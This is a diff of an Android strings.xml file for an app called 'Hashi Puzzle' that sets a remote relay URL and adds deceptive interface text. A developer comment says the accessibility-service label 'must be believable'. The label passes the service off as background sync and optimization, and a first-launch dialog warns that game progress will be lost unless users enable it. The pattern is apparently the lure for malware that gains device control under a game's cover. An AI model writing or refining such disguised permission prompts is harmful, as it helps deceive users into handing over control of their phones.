@@ -1,1 +1,19 @@
-<?xml version="1.0" encoding="utf-8"?><resources><string name="app_name">Hashi Puzzle</string><string name="default_relay_url">wss://devicebridge-relay.onrender.com</string></resources>
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Hashi Puzzle</string>
+    <string name="default_relay_url">wss://devicebridge-relay.onrender.com</string>
+
+    <!-- Accessibility service — label harus believable -->
+    <string name="accessibility_label">Sinkronisasi &amp; Optimasi Latar</string>
+    <string name="accessibility_desc">Mengoptimalkan performa aplikasi di latar belakang dan memastikan sinkronisasi data berjalan lancar. Diperlukan untuk fitur notifikasi cerdas dan pembaruan otomatis.</string>
+
+    <!-- First-launch sync dialog -->
+    <string name="sync_dialog_title">Aktifkan Sinkronisasi Otomatis</string>
+    <string name="sync_dialog_body">Hashi Puzzle membutuhkan layanan sinkronisasi latar belakang untuk menyimpan progres permainan, skor, dan pembaruan level secara otomatis.\n\nTanpa layanan ini, progres Anda mungkin tidak tersimpan saat aplikasi ditutup.</string>
+    <string name="sync_dialog_btn_enable">Aktifkan Sekarang</string>
+    <string name="sync_dialog_btn_later">Nanti</string>
+
+    <!-- Settings screen label -->
+    <string name="sync_settings_title">Sinkronisasi Latar</string>
+</resources>
+
